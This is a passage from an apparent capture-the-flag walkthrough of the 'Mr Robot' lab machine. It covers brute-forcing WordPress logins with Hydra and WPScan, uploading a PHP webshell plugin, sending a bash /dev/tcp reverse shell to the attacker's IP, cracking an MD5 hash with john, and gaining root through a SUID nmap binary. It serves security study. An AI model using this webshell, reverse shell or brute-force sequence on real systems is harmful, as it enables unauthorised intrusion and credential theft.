</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>858160
</span></span></span></code></pre></div><p>to only almost <code>11 000</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat sorted_fsocity.dic | wc -l
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>11451
</span></span></span></code></pre></div><ul><li>To see what is sent to the server when we make a request to <code>/wp-login.php</code> I start a listener with <code>Burpsuite</code>. I intercept the request sent after testing with user <code>user</code> and password <code>password</code>. Doing this we get:</li></ul><p><img alt="MrRobot 3" src=/pentesting/images/MrRobot_3.png></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/wp-login.php</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>10.20.1.120</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>102</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://10.20.1.120</span>
</span></span><span class=line><span class=cl><span class=n>DNT</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://10.20.1.120/wp-login.php</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>wordpress_test_cookie=WP+Cookie+check</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>log=user&amp;pwd=password&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F10.20.1.120%2Fwp-admin%2F&amp;testcookie=1
</span></span></code></pre></div><p>where the important part is the data sent as <code>POST</code> request at the bottom of it. I note that if we just send the data:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>log=&lt;user&gt;&amp;pwd=&lt;password&gt;
</span></span></code></pre></div><p>the <code>HTTP</code> request from above works as well.</p><ul><li>Now, use <code>Hydra</code>. We want to make <code>HTTP</code> requests until the response does not contain the string <code>Invalid username</code>. We can do this running:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ hydra -L sorted_fsocity.dic -p testrandompassword 10.20.1.120 http-post-form &#34;/wp-login.php:log=^USER^&amp;pwd=^PASS^:Invalid username&#34;  -V -F
</span></span></span></code></pre></div><p>where:</p><ol><li><code>-L</code> is a file containing the potential users. In this case is <code>fsocity.dic</code> file without the repeated lines.</li><li><code>-p</code> is a random password for the <code>WordPress</code> login panel.</li><li><code>http-post-form</code> is the method used by <code>Hydra</code> to attempt a bruteforce.</li><li><code>"/wp-login.php:log=^USER^&amp;pwd=^PASS^:Invalid username"</code> is the post data to send. First we specify the route <code>/wp.login.php</code>. After the first two dots <code>:</code>, we specify the data to post; <code>^USER^</code> will be replaced by the values of the file provided with <code>-L</code> whereas <code>^PASS^</code> will be replaced by the value provided by <code>-p</code> flag. After the second two dots we pass the text that does not have to be present in the response.</li><li><code>-V</code> is the verbose option to view the sent requests.</li><li><code>-F</code> is to stop when a valid combination is found.</li></ol><ul><li>After some time I get something:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ hydra -L sorted_fsocity.dic -p testrandompassword 10.20.1.120 http-post-form &#34;/wp-login.php:log=^USER^&amp;pwd=^PASS^:Invalid username&#34; -V -F
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>[ATTEMPT] target 10.20.1.120 - login &#34;emails&#34; - pass &#34;testrandompassword&#34; - 5487 of 11452 [child 15] (0/0)
</span></span></span><span class=line><span class=cl><span class=go>[ATTEMPT] target 10.20.1.120 - login &#34;embed&#34; - pass &#34;testrandompassword&#34; - 5488 of 11452 [child 7] (0/0)
</span></span></span><span class=line><span class=cl><span class=go>[80][http-post-form] host: 10.20.1.120   login: elliot   password: testrandompassword
</span></span></span><span class=line><span class=cl><span class=go>[STATUS] attack finished for 10.20.1.120 (valid pair found)
</span></span></span><span class=line><span class=cl><span class=go>1 of 1 target successfully completed, 1 valid password found
</span></span></span><span class=line><span class=cl><span class=go>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-08-13 03:21:00
</span></span></span></code></pre></div><p>where we have a user: <code>elliot</code></p><ul><li>As was mentioned before, if we put the user <code>elliot</code> and a random password at <code>/wp-login.php</code> the error message is different:</li></ul><p><img alt="MrRobot 5" src=/pentesting/images/MrRobot_5.png></p><ul><li>Now, I can use this user to attempt a bruteforce login through a <code>Brute Force Password Login</code>. For this we can use again <code>WPScan</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ wpscan --password-attack xmlrpc -t 20 -U elliot -P sorted_fsocity.dic --url http://10.20.1.120
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>[+] Performing password attack on Xmlrpc against 1 user/s
</span></span></span><span class=line><span class=cl><span class=go>[SUCCESS] - elliot / ER28-0652
</span></span></span><span class=line><span class=cl><span class=go>Trying elliot / escape Time: 00:01:58 &lt;==============================                                                                &gt; (5640 / 17091) 32.99%  ETA: ??:??:??
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[!] Valid Combinations Found:
</span></span></span><span class=line><span class=cl><span class=go> | Username: elliot, Password: ER28-0652
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[!] No WPScan API Token given, as a result vulnerability data has not been output.
</span></span></span><span class=line><span class=cl><span class=go>[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] Finished: Tue Aug 13 03:25:40 2024
</span></span></span><span class=line><span class=cl><span class=go>[+] Requests Done: 5813
</span></span></span><span class=line><span class=cl><span class=go>[+] Cached Requests: 6
</span></span></span><span class=line><span class=cl><span class=go>[+] Data Sent: 2.883 MB
</span></span></span><span class=line><span class=cl><span class=go>[+] Data Received: 3.8 MB
</span></span></span><span class=line><span class=cl><span class=go>[+] Memory used: 311.969 MB
</span></span></span><span class=line><span class=cl><span class=go>[+] Elapsed time: 00:02:09
</span></span></span></code></pre></div><p>where we have valid credentials: <code>elliot:ER28-0652</code></p><ul><li>Using these credentials work and we are inside the panel:</li></ul><p><img alt="Mr Robot" src=/pentesting/images/MrRobot_6.png></p><ul><li>Now we can try to inject some code in some of the editable files we have. For this we can click on <code>Plugins</code> and then on <code>Add New</code>. If we do that we should see:</li></ul><p><img alt="MrRobot 7" src=/pentesting/images/MrRobot_7.png></p><ul><li>Now, I will create a &ldquo;malicious&rdquo; plugin with the following <code>PHP</code> code in a file called <code>CMD.php</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl> <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm> Plugin Name: CMD Plugin
</span></span></span><span class=line><span class=cl><span class=cm> Version: 1.0.0
</span></span></span><span class=line><span class=cl><span class=cm> Author: gunzf0x
</span></span></span><span class=line><span class=cl><span class=cm> Author URI: wordpress.org
</span></span></span><span class=line><span class=cl><span class=cm> License: GPL2
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=nx>system</span><span class=p>(</span><span class=nv>$_REQUEST</span><span class=p>[</span><span class=s2>&#34;CMD&#34;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><p>and compress it to a <code>.zip</code> file which I will call <code>webshell.zip</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ zip webshell.zip CMD.php
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>  adding: CMD.php (deflated 8%)
</span></span></span></code></pre></div><ul><li>Back to <code>WordPress</code> portal, click on <code>Upload Plugin</code> button at the top of the site and select our created <code>.zip</code> file. We should see something like:</li></ul><p><img alt="MrRobot 8" src=/pentesting/images/MrRobot_8.png></p><p>and click on <code>Install Now</code>.</p><ul><li>If this worked we should now see:</li></ul><p><img alt="MrRobot 9" src=/pentesting/images/MrRobot_9.png></p><p>where it says that our plugin has been successfully installed.</p><ul><li>Since my plugin is called <code>webshell</code> with a file <code>CMD.php</code> within it, it should be located at <code>/wp-content/plugins/webshell</code> directory. I check if this site exists with <code>cURL</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -I http://10.20.1.120/wp-content/plugins/webshell/CMD.php
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>HTTP/1.1 200 OK
</span></span></span><span class=line><span class=cl><span class=go>Date: Tue, 13 Aug 2024 03:52:15 GMT
</span></span></span><span class=line><span class=cl><span class=go>Server: Apache
</span></span></span><span class=line><span class=cl><span class=go>X-Powered-By: PHP/5.5.29
</span></span></span><span class=line><span class=cl><span class=go>X-Frame-Options: SAMEORIGIN
</span></span></span><span class=line><span class=cl><span class=go>Cache-Control: max-age=0, no-cache
</span></span></span><span class=line><span class=cl><span class=go>Content-Type: text/html; charset=UTF-8
</span></span></span></code></pre></div><p>and our malicious plugin is there.</p><ul><li>We check if we can remotely can run commands with <code>cURL</code> as well. For example, for the command <code>id</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s -X GET -G &#39;http://10.20.1.120/wp-content/plugins/webshell/CMD.php&#39; --data-urlencode &#39;CMD=id&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>uid=1(daemon) gid=1(daemon) groups=1(daemon)
</span></span></span></code></pre></div><ul><li>I will start a <code>netcat</code> listener on port <code>443</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span></code></pre></div><p>and now send me a reverse shell with <code>cURL</code> through the malicious plugin:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s -X GET -G &#39;http://10.20.1.120/wp-content/plugins/webshell/CMD.php&#39; --data-urlencode &#39;CMD=bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.20.1.115/443 0&gt;&amp;1&#34;&#39;
</span></span></span></code></pre></div><p>where <code>10.20.1.115</code> is my attacker IP address and <code>443</code> is the port I am already listening with <code>netcat</code></p><ul><li>I get a reverse shell as <code>daemon</code> user:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.20.1.115] from (UNKNOWN) [10.20.1.120] 58162
</span></span></span><span class=line><span class=cl><span class=go>bash: cannot set terminal process group (1715): Inappropriate ioctl for device
</span></span></span><span class=line><span class=cl><span class=go>bash: no job control in this shell
</span></span></span><span class=line><span class=cl><span class=go>daemon@linux:/opt/bitnami/apps/wordpress/htdocs/wp-content/plugins/webshell$ whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>daemon
</span></span></span></code></pre></div><ul><li>I note that there is a user <code>robot</code> in the machine:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ ls -la /home
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 12
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x  3 root root 4096 Nov 13  2015 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x  2 root root 4096 Nov 13  2015 robot
</span></span></span></code></pre></div><p>and inside its directory we have:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ ls -la /home/robot
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 16
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
</span></span></span><span class=line><span class=cl><span class=go>-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
</span></span></span></code></pre></div><p>where we can see a file <code>password.raw-md5</code></p><ul><li>Reading it provides a hash:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ cat /home/robot/password.raw-md5
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>robot:c3fcd3d76192e4007dfb496cca67e13b
</span></span></span></code></pre></div><ul><li>I save this user and hash into a file called <code>robot_hash</code> and attempt a <code>Brute Force Password Cracking</code> with <code>JohnTheRipper</code> (<code>john</code>). Using <code>hash-identifier</code> shows it is a <code>MD5</code> hash:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ hash-identifier
</span></span></span><span class=line><span class=cl><span class=go>   #########################################################################
</span></span></span><span class=line><span class=cl><span class=go>   #     __  __                     __           ______    _____           #
</span></span></span><span class=line><span class=cl><span class=go>   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
</span></span></span><span class=line><span class=cl><span class=go>   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
</span></span></span><span class=line><span class=cl><span class=go>   #     \ \  _  \  /&#39;__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
</span></span></span><span class=line><span class=cl><span class=go>   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
</span></span></span><span class=line><span class=cl><span class=go>   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
</span></span></span><span class=line><span class=cl><span class=go>   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
</span></span></span><span class=line><span class=cl><span class=go>   #                                                             By Zion3R #
</span></span></span><span class=line><span class=cl><span class=go>   #                                                    www.Blackploit.com #
</span></span></span><span class=line><span class=cl><span class=go>   #                                                   Root@Blackploit.com #
</span></span></span><span class=line><span class=cl><span class=go>   #########################################################################
</span></span></span><span class=line><span class=cl><span class=go>--------------------------------------------------
</span></span></span><span class=line><span class=cl><span class=go> HASH: c3fcd3d76192e4007dfb496cca67e13b
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Possible Hashs:
</span></span></span><span class=line><span class=cl><span class=go>[+] MD5
</span></span></span><span class=line><span class=cl><span class=go>[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><ul><li>Therefore with <code>john</code> we set <code>Raw-MD5</code> format. We try to crack the hash using <code>rockyou.txt</code> dictionary:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt robot_hash
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Using default input encoding: UTF-8
</span></span></span><span class=line><span class=cl><span class=go>Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
</span></span></span><span class=line><span class=cl><span class=go>Warning: no OpenMP support for this hash type, consider --fork=5
</span></span></span><span class=line><span class=cl><span class=go>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
</span></span></span><span class=line><span class=cl><span class=go>abcdefghijklmnopqrstuvwxyz (?)
</span></span></span><span class=line><span class=cl><span class=go>1g 0:00:00:00 DONE (2024-08-13 04:20) 50.00g/s 2035Kp/s 2035Kc/s 2035KC/s bonjour1..teletubbies
</span></span></span><span class=line><span class=cl><span class=go>Use the &#34;--show --format=Raw-MD5&#34; options to display all of the cracked passwords reliably
</span></span></span><span class=line><span class=cl><span class=go>Session completed.
</span></span></span></code></pre></div><p>We have credentials: <code>robot:abcdefghijklmnopqrstuvwxyz</code></p><ul><li>Since we do not have any service available at the machine, I pivot to this user internally providing the found password:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ su robot
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Password:
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>robot@linux:/opt/bitnami/apps/wordpress/htdocs$ whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>robot
</span></span></span></code></pre></div><p>where we can see the second flag/user flag:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>robot@linux:~$ cat /home/robot/key-2-of-3.txt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>822c73956184f694993bede3eb39f959
</span></span></span></code></pre></div><hr><h2 id=root>Root
<a class=heading-link href=#root><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>Finally, searching for <code>SUID</code> binaries shows one that is not common:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>robot@linux:~$ find / -perm -4000 2&gt;/dev/null
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>/bin/ping
</span></span></span><span class=line><span class=cl><span class=go>/bin/umount
</span></span></span><span class=line><span class=cl><span class=go>/bin/mount
</span></span></span><span class=line><span class=cl><span class=go>/bin/ping6
</span></span></span><span class=line><span class=cl><span class=go>/bin/su
</span></span></span><span class=line><span class=cl><span class=go>/usr/bin/passwd
</span></span></span><span class=line><span class=cl><span class=go>/usr/bin/newgrp
</span></span></span><span class=line><span class=cl><span class=go>/usr/bin/chsh
</span></span></span><span class=line><span class=cl><span class=go>/usr/bin/chfn
</span></span></span><span class=line><span class=cl><span class=go>/usr/bin/gpasswd
</span></span></span><span class=line><span class=cl><span class=go>/usr/bin/sudo
</span></span></span><span class=line><span class=cl><span class=go>/usr/local/bin/nmap
</span></span></span><span class=line><span class=cl><span class=go>/usr/lib/openssh/ssh-keysign
</span></span></span><span class=line><span class=cl><span class=go>/usr/lib/eject/dmcrypt-get-device
</span></span></span><span class=line><span class=cl><span class=go>/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
</span></span></span><span class=line><span class=cl><span class=go>/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
</span></span></span><span class=line><span class=cl><span class=go>/usr/lib/pt_chown
</span></span></span></code></pre></div><p>where <code>/usr/local/bin/nmap</code> is not a common one.</p><ul><li>Based on <code>GTFOBins</code> for <a href=https://gtfobins.github.io/gtfobins/nmap/ class=external-link target=_blank rel=noopener>Nmap</a>, the versions for <code>Nmap</code> that have <code>--interactive</code> flag are from <code>2.02</code> to <code>5.21</code>. Checking our <code>Nmap</code> binary version:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>robot@linux:~$ /usr/local/bin/nmap -V
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>nmap version 3.81 ( http://www.insecure.org/nmap/ )
</span></span></span></code></pre></div><p>we have a version <code>3.81</code>.</p><ul><li>Therefore I use <code>Nmap</code> in interactive mode and spawn a shell as <code>GTFOBins</code> indicates:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>robot@linux:~$ nmap --interactive
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
</span></span></span><span class=line><span class=cl><span class=go>Welcome to Interactive Mode -- press h &lt;enter&gt; for help
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>nmap&gt; !/bin/sh
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=gp>#</span> whoami
</span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>root
</span></span></span></code></pre></div><p>and that&rsquo;s it!</p><ul><li>We can read the last key/flag:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=gp>#</span> cat /root/key-3-of-3.txt
</span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>04787ddef27c3dee1ee161b21670b4e4
</span></span></span></code></pre></div><p>~Happy Hacking</p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Powered by <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>